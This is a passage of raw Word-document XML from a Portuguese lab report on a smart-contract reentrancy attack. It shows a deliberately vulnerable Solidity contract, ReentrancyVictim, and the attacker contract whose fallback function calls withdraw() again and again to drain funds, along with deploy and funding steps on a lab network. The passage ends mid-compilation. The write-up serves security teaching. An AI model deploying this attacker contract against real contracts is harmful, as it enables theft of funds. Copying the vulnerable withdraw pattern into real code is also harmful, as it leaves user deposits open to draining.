          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> web3 </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web3</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address </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> web3.eth.accounts[</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="40A070"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w: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balance </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> web3.eth.get_balance(Web3.toChecksumAddress(address))</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="BB6688"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">f"Saldo: </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="4070A0"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Web3</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="4070A0"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">fromWei(balance, </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="4070A0"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>'ether'</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="4070A0"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="BB6688"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ETH"</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A681C9E"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 conta selecionada (accounts[1]) tinha saldo suficiente para as operações do laboratório.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771E9291" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00000000" w:rsidP="00224B0C">
      <w:r>
        <w:pict w14:anchorId="5416CED7">
          <v:rect id="_x0000_i1025" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE9B537" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="143" w:name="_Toc213881941"/>
      <w:r>
        <w:t>3. Task 1: Deploy e Análise do Contrato Vulnerável</w:t>
      </w:r>
      <w:bookmarkEnd w:id="143"/>
    </w:p>
    <w:p w14:paraId="22D9F897" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="144" w:name="_Toc213881942"/>
      <w:r>
        <w:t>3.1 Análise do Código Fonte</w:t>
      </w:r>
      <w:bookmarkEnd w:id="144"/>
    </w:p>
    <w:p w14:paraId="1F228B34"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Examinamos o contrato </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ReentrancyVictim.sol</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> fornecido no laboratório:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B431546"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pragma solidity ^0.6.8;</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contract ReentrancyVictim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mapping (address =&gt; uint) public balances;</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deposit() public payable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balances[msg.sender] += msg.value;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withdraw(uint _amount) public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require(balances[msg.sender] &gt;=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(bool sent, ) = msg.sender.call{value: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require(sent, "Failed to send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balances[msg.sender] -=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getBalance(address _addr) public view returns (uint)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return balances[_addr];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getContractBalance() public view returns (uint)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return address(this).balance;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p>
    <w:p w14:paraId="2793C791"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Identificação da Vulnerabilidade:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5BD4CC"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Na função </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>withdraw()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, observamos que: 1. Linha 11: Verifica se o usuário tem saldo suficiente 2. Linha 12: Envia Ether usando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>call()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> de baixo nível 3. Linha 14: Atualiza o saldo interno</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFF8F1E"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 vulnerabilidade está clara: o saldo é atualizado APÓS o envio do Ether. Durante a execução de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>call()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, o controle é transferido para o endereço de destino, permitindo que código malicioso seja executado antes da atualização do saldo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3322593A" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="145" w:name="_Toc213881943"/>
      <w:r>
        <w:t>3.2 Compilação do Contrato</w:t>
      </w:r>
      <w:bookmarkEnd w:id="145"/>
    </w:p>
    <w:p w14:paraId="47C5CC0E"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Compilamos o contrato usando Solidity 0.6.8 (versão vulnerável):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A320197" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pP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/Labsetup/contract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solc-0.6.8 </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>--overwrite</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--abi</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--bin</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-o</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> . </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ReentrancyVictim.sol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B73C2CA"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 compilação foi bem-sucedida, gerando os arquivos: - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ReentrancyVictim.bin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Bytecode do contrato - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ReentrancyVictim.abi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Interface JSON do contrato</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63049D6A" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="146" w:name="_Toc213881944"/>
      <w:r>
        <w:t>3.3 Deploy do Contrato Vítima</w:t>
      </w:r>
      <w:bookmarkEnd w:id="146"/>
    </w:p>
    <w:p w14:paraId="4317EA23"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Executamos o script de deploy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077E1982"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/Labsetup/victim</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deploy_victim_contract.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA54D12"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O script retornou o endereço do contrato implantado. Este endereço foi guardado para uso nas próximas etapas, sendo necessário para todas as interações futuras com o contrato vítima.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8A71E5" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="147" w:name="_Toc213881945"/>
      <w:r>
        <w:t>3.4 Financiamento do Contrato</w:t>
      </w:r>
      <w:bookmarkEnd w:id="147"/>
    </w:p>
    <w:p w14:paraId="5D404D89"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Editamos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>fund_victim_contract.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> com o endereço do contrato e alteramos a quantidade para 30 ETH conforme solicitado pela task:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06EB5777"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 xml:space="preserve">victim_addr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70A0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'&lt;ENDEREÇO_DO_CONTRATO_VÍTIMA&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">amount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A070"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8729C7"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color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Executamos o script:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155A7DF4"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python3 fund_victim_contract.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9EB821"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 transação foi processada e incluída num bloco. Verificamos o saldo do contrato usando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get_balance.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, confirmando que o contrato vítima tinha 30 ETH depositados.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230AB690" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="148" w:name="_Toc213881946"/>
      <w:r>
        <w:t>3.5 Teste de Retirada Normal</w:t>
      </w:r>
      <w:bookmarkEnd w:id="148"/>
    </w:p>
    <w:p w14:paraId="6D0A6D5B" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00371B58" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Testamos a função </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>withdraw()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> em condições normais. </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Editamos </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>withdraw_from_victim_contract.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44121AFE"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">victim_addr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70A0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'&lt;ENDEREÇO_DO_CONTRATO_VÍTIMA&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">amount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A070"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A26183"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color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Executamos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41838CE5"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python3 withdraw_from_victim_contract.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC110C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 retirada foi bem-sucedida. O script mostrou o saldo atualizado da conta após a transação. Verificando o saldo do contrato, confirmamos que tinha 25 ETH restantes (30 - 5).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAD3EC3"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 retirada funcionou corretamente em uso legítimo, confirmando que o contrato opera normalmente quando não explorado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344DBFF1" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00000000" w:rsidP="00224B0C">
      <w:r>
        <w:pict w14:anchorId="0A09E088">
          <v:rect id="_x0000_i1026" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C95931" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="149" w:name="_Toc213881947"/>
      <w:r>
        <w:t>4. Task 2: Deploy do Contrato Atacante</w:t>
      </w:r>
      <w:bookmarkEnd w:id="149"/>
    </w:p>
    <w:p w14:paraId="386F8212" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="150" w:name="_Toc213881948"/>
      <w:r>
        <w:t>4.1 Análise do Contrato de Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="150"/>
    </w:p>
    <w:p w14:paraId="28DDBB24"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Analisamos o contrato </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ReentrancyAttacker.sol</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> fornecido:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D611C4F"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pragma solidity ^0.6.8;</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import "./ReentrancyVictim.sol";</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contract ReentrancyAttacker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ReentrancyVictim public victim;</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address payable _owner;</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constructor(address payable _addr) public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victim = ReentrancyVictim(_addr);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_owner = payable(msg.sender);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fallback() external payable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if(address(victim).balance &gt;= 1 ether)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victim.withdraw(1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attack() external payable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require(msg.value &gt;= 1 ether, "You need to send one ether when attacking");</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victim.deposit{value: 1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victim.withdraw(1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getBalance() public view returns (uint)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return address(this).balance;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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    }</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function cashOut(address payable _addr) external payable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require(msg.sender == _owner);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_addr.transfer(address(this).balance);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p>
    <w:p w14:paraId="7187E06F"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Compreensão do Mecanismo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B9E51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A função </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>fallback()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> é a chave do ataque. Quando o contrato atacante recebe Ether da vítima (durante a execução de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>withdraw()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">), esta função é automaticamente invocada. Ela verifica se a vítima ainda tem saldo e, em caso afirmativo, chama </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>withdraw()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> novamente, criando um ciclo recursivo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9619B0" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="151" w:name="_Toc213881949"/>
      <w:r>
        <w:t>4.2 Compilação</w:t>
      </w:r>
      <w:bookmarkEnd w:id="151"/>
    </w:p>
    <w:p w14:paraId="1B64649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Compilamos o contrato atacante:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75737454" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pP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/Labsetup/contract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solc-0.6.8 </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>--overwrite</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--abi</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--bin</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-o</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
